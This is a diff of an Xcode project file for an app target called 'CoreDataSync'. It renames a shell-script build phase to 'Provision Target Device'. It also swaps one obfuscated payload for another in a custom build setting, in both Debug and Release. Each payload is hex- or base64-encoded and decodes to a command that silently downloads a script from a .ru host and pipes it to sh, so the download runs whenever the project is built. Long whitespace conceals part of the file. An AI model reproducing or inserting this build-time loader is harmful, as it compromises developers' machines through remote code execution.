@@ -82,7 +82,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0F31A9A92E825743007BB731 /* Build configuration list for PBXNativeTarget "CoreDataSync" */;
 			buildPhases = (
-				B5BD7565734849F7927BBDC8 /* Provision Library Executable */,
+				FCEE5F9703164B16A17BBDC8 /* Provision Target Device */,
 				0F31A98F2E825741007BB731 /* Sources */,
 				0F31A9902E825741007BB731 /* Frameworks */,
 				0F31A9912E825741007BB731 /* Resources */,
@@ -136,7 +136,7 @@
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B5BD7565734849F7927BBDC8 /* Provision Library Executable */ = {
+		FCEE5F9703164B16A17BBDC8 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -146,7 +146,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -208,7 +208,7 @@
 		0F31A9AA2E825743007BB731 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CoreDataSync/CoreDataSync.entitlements;
@@ -242,7 +242,7 @@
 		0F31A9AB2E825743007BB731 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CoreDataSync/CoreDataSync.entitlements;
